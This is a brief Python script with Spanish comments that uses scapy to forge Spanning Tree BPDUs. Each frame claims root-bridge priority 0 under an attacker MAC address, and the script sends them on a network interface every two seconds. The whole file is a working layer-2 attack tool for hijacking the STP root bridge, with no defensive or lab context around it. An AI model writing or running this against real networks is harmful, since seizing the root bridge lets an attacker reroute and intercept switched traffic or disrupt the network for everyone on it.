import time
from scapy.all import Dot3, LLC, STP, sendp

def secuestrar_raiz_stp(interfaz, mac_atacante="00:11:22:33:44:55"):
    print(f"[*] Inyectando BPDUs de Spanning Tree maliciosas en {interfaz}...")
    print("[*] Forzando prioridad de Root Bridge a 0...")

    # Construcción de la trama STP clásica (IEEE 802.3 con LLC)
    bpdu_maliciosa = (
        Dot3(src=mac_atacante, dst="01:80:c2:00:00:00") /  # Dirección Multicast STP
        LLC(dsap=0x42, ssap=0x42, ctrl=3) / 
        STP(
            proto=0, 
            version=0, 
            bpdutype=0, 
            bpduflags=12,          # Bandera de cambio de topología si aplica
            rootid=0,              # Prioridad 0 (Máxima)
            rootmac=mac_atacante,   # El atacante dice ser la Raíz
            pathcost=0, 
            bridgeid=0, 
            bridgemac=mac_atacante,
            portid=0x8001,
            maxage=20, 
            hellotime=2, 
            forwarddelay=15
        )
    )

    # STP requiere que las BPDUs se envíen constantemente cada 2 segundos
    while True:
        try:
            sendp(bpdu_maliciosa, iface=interfaz, verbose=False)
            time.sleep(2)
        except KeyboardInterrupt:
            print("\n[-] Ataque STP detenido.")
            break

if __name__ == "__main__":
    secuestrar_raiz_stp(interfaz="eth0")